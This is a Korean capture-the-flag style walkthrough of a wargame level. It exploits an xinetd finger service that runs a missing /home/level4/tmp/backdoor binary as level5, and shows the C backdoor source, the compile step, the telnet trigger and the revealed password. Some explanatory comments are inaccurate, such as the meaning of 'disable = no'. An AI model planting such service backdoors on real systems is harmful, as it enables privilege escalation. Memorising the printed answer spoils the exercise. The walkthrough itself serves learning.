# 문제풀이

1. `cat hint` 입력결과 아래 내용이 출력되었다.

"누군가 /etc/xinetd.d/에 백도어를 심어놓았다.!"

2. 해당 경로로 이동해 backdoor 파일을 찾았다. 파일은 읽기권한만 있어 `cat`명령어로 내용을 확인하겠다.

service finger
{
disable = no # no 설정으로 나열된 서비스 값들이 실행되지 못한다.
flags = REUSE # 포트가 사용중인 경우에도 재이용 할 수 있도록 지원한다.
socket_type = stream # stream 기반의 서비스로 설정
wait = no # 다중 스레드를 사용 ("yes"는 단일 스레드)
user = level5 # level5 사용자가 실행가능
server = /home/level4/tmp/backdoor # /home/level4/tmp/ 폴더의 백도어 파일 실행
log_on_failure += USERID # 원격사용자 ID
}
finger 서비스는 user의 정보를 얻어오는 명령어다. 따라서 서비스는 아래의 의미를 지닌다.
`finger 서비스를 실행하면 level5 권한으로 /home/level4/tmp/backdoor 실행`

3. /home/level4/tmp/ 경로로 이동해 `backdoor`파일을 찾아봤지만 존재하지 않아 파일을 직접 생성해야한다.

## source code

```c
#include <stdio.h>
#include <stdlib.h> // system 함수를 사용하려면 해당 라이브러리를 사용

// system()함수는 명령어를 실행하는 함수다.
int main(void)
{
    system("my-pass");
}
```

아래 명령어로 컴파일 한다.
`gcc -o backdoor backdoor.c`

## finger 포트

아래 명령어를 사용해 `finger` 서비스의 포트번호를 확인결과 79번 포트를 사용한다.
`cat /etc/services | grep finger`

`services`는 현재 실행중인 서비스와 포트번호를 출력한다.
`gerp` 특정 문자열을 찾을 때 사용하는 명령어

`telnet`을 이용해 `finger`서비스를 실행한다.
`telnet localhost 79`

password : what is your name?
